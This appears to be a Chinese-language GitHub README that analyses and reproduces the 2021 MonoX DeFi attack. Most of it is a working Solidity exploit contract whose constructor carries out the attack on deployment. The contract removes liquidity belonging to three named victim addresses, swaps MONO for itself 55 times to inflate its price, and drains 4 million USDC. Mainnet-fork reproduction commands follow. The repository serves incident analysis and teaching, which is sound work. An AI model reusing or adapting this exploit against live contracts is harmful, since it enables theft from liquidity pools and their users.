# MonoX_Vul
MonoX被攻击事件的分析和复现

[攻击事件的分析](./MonoX%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90.md)


[部署即攻击版完整代码](./poc.sol)

[步骤拆分版完整代码](./Step_By_Step.sol)

### 核心攻击代码

* 注意下面的代码缺少Interface, 不能直接复制
* 所有的攻击步骤都在构造函数`constructor()`中实现, 也就是说当合约部署完成,攻击也已经完成
* 本次复现仅做原理性验证, 攻击者通过闪电贷来避免滑点,实现利益最大化
* 但其实不调用闪电贷,攻击的主要步骤也已经完成,所以攻击者的后续操作就没有再跟进
* POC只尝试从池子中拿走400万`USDC`,就结束了攻击

```js
contract POC{

    address WETH9_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address Mono_Token_Address = 0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D;

    address MonoXPool_Address = 0x59653E37F8c491C3Be36e5DD4D503Ca32B5ab2f4;

    address Monoswap_address =  0xC36a7887786389405EA8DA0B87602Ae3902B88A1;
    // 无辜的大户地址1
    address Innocent_user_1 = 0x7B9aa6ED8B514C86bA819B99897b69b608293fFC;
    // 无辜的大户地址2
    address Innocent_user_2 = 0x81D98c8fdA0410ee3e9D7586cB949cD19FA4cf38;
    // 无辜的大户地址3
    address Innocent_user_3 = 0xab5167e8cC36A3a91Fd2d75C6147140cd1837355;

    address USDC_Address =  0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    uint256 Amount_Of_MonoToken_On_XPool;

    uint256 public Amount_Of_USDC_On_XPool;
    
    uint256 public Amoount_Of_Mono_On_This; 


    constructor()  public payable{
        // 把MonoToken的全部额度授权给MonoSwap 
        MonoToken(Mono_Token_Address).approve(Monoswap_address,type(uint256).max);
        // 把0.1个ETH换成0.1个WETH
        WETH9(WETH9_Address).deposit{value:address(this).balance,gas:40000}();
        // 把0.1个WETH的额度授权给MonoSwap
        WETH9(WETH9_Address).approve(Monoswap_address,0.1 ether);
        // 用0.1个WETH在MonoSwap上购买MonoToken
        Monoswap(Monoswap_address).swapExactTokenForToken(WETH9_Address,Mono_Token_Address,0.1 ether,1,address(this),block.timestamp);
        // 把XPool中三个大户的流动性全部剔除
        RemoveLiquidity_From_3_Users();
        // 添加自己的流动性
        Monoswap(Monoswap_address).addLiquidity(Mono_Token_Address,196875656,address(this));
        // 用Mono换Mono 共55次
        Swap_Mono_for_Mono_55_Times();
        // 用极少量的Mono换到400万的USDC
        Swap_Mono_For_USDC();

    }


    function RemoveLiquidity_From_3_Users() internal{
        uint256 balance_Of_User1 = MonoXPool(MonoXPool_Address).balanceOf(Innocent_user_1,10);

        Monoswap(Monoswap_address).removeLiquidity(Mono_Token_Address,balance_Of_User1,Innocent_user_1,0,1);

        uint256 balance_Of_User2 = MonoXPool(MonoXPool_Address).balanceOf(Innocent_user_2,10);

        Monoswap(Monoswap_address).removeLiquidity(Mono_Token_Address,balance_Of_User2,Innocent_user_2,0,1);

        uint256 balance_Of_User3 = MonoXPool(MonoXPool_Address).balanceOf(Innocent_user_3,10);

        Monoswap(Monoswap_address).removeLiquidity(Mono_Token_Address,balance_Of_User3,Innocent_user_3,0,1);
    }

    function Swap_Mono_for_Mono_55_Times() internal{

        for(uint256 i=0;i < 55; i++){

            (,,,,,,Amount_Of_MonoToken_On_XPool,,) = Monoswap(Monoswap_address).pools(Mono_Token_Address);

            Monoswap(Monoswap_address).swapExactTokenForToken(Mono_Token_Address,Mono_Token_Address,Amount_Of_MonoToken_On_XPool-1,0,address(this),block.timestamp);
            
        }
    }

    function Swap_Mono_For_USDC() internal{

        (,,,,,,Amount_Of_USDC_On_XPool,,) = Monoswap(Monoswap_address).pools(USDC_Address);

        Amoount_Of_Mono_On_This = MonoToken(Mono_Token_Address).balanceOf(address(this));

        Monoswap(Monoswap_address).swapTokenForExactToken(Mono_Token_Address,USDC_Address,Amoount_Of_Mono_On_This,4000000000000,msg.sender,block.timestamp);
    }


    receive() payable external{}


    function onERC1155Received(address _operator, address _from, uint256 _id, uint256 _value, bytes calldata _data) external returns(bytes4){
        bytes4 a = 0xf23a6e61;
        return a;
    }
```

### 复现方法

* 主网上的攻击发生在高度为`13715026`的块上, 所以同样我们选前一个块去fork

```
npx ganache-cli  --fork https://eth-mainnet.alchemyapi.io/v2/Your_API_KEY@13715025   -l 4294967295
```

* 部署攻击合约 注意部署时要带上100个`Finney`, 也就是0.1个`ETH`

![image](./images//%E9%83%A8%E7%BD%B2%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6.png)

* 攻击前的MetaMask钱包余额

![image](./images//%E6%94%BB%E5%87%BB%E5%89%8D%E7%9A%84MetaMask%E9%92%B1%E5%8C%85%E4%BD%99%E9%A2%9D.png)

* 攻击后的钱包余额

![image](./images//%E6%94%BB%E5%87%BB%E5%90%8E%E7%9A%84%E9%92%B1%E5%8C%85%E4%BD%99%E9%A2%9D.png)

